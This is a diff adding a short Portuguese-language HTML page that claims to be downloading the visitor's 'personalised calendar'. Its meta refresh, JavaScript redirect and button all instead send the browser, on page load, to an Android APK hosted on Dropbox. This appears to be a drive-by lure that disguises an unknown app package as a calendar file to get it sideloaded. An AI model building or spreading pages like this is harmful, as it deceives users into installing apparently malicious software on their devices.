@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Control</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #0b0f19;
+            color: #f3f4f6;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 32px 24px;
+            text-align: center;
+            max-width: 380px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+        }
+        .icon-container {
+            position: relative;
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .spinner {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid rgba(59, 130, 246, 0.1);
+            border-top: 3px solid #3b82f6;
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+        .icon {
+            font-size: 28px;
+            animation: pulse 2s infinite;
+        }
+        h1 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        p {
+            font-size: 14px;
+            color: #9ca3af;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            background-color: #3b82f6;
+            color: #ffffff;
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: background 0.2s, transform 0.1s;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+        }
+        .btn:active {
+            transform: scale(0.98);
+            background-color: #2563eb;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.05); opacity: 1; }
+        }
+    </style>
+    <meta http-equiv="refresh" content="1;url=https://www.dropbox.com/scl/fi/9328kxpvz4vawrpjs7zqw/application-7ec252e8-6842-42d1-b817-4f1820305179.apk?rlkey=7fhlwsdlunan9a0rqg6rvk9cp&st=nl9umcfx&dl=1">
+</head>
+<body>
+
+    <div class="card">
+        <div class="icon-container">
+            <div class="spinner"></div>
+            <div class="icon">📅</div>
+        </div>
+        <h1>A preparar o download</h1>
+        <p>O teu calendário personalizado está a ser descarregado automaticamente.</p>
+        
+        <a class="btn" href="https://www.dropbox.com/scl/fi/9328kxpvz4vawrpjs7zqw/application-7ec252e8-6842-42d1-b817-4f1820305179.apk?rlkey=7fhlwsdlunan9a0rqg6rvk9cp&st=nl9umcfx&dl=1">Descarregar Manualmente</a>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://www.dropbox.com/scl/fi/9328kxpvz4vawrpjs7zqw/application-7ec252e8-6842-42d1-b817-4f1820305179.apk?rlkey=7fhlwsdlunan9a0rqg6rvk9cp&st=nl9umcfx&dl=1";
+        }, 1200);
+    </script>
+</body>
+</html>
